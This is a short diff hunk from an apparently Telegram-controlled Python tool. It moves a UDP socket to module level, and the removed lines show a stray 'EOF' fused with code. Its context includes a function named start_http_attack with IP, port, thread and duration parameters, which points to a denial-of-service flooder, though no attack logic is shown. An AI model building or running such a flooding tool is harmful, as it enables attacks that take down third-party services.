@@ -438,9 +438,7 @@ def main():
     updater.start_polling()
     updater.idle()
 
-if __name__ == "__main__":
-    main()
-EOF            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 def start_http_attack(ip, port, threads, duration):
     global attack_active
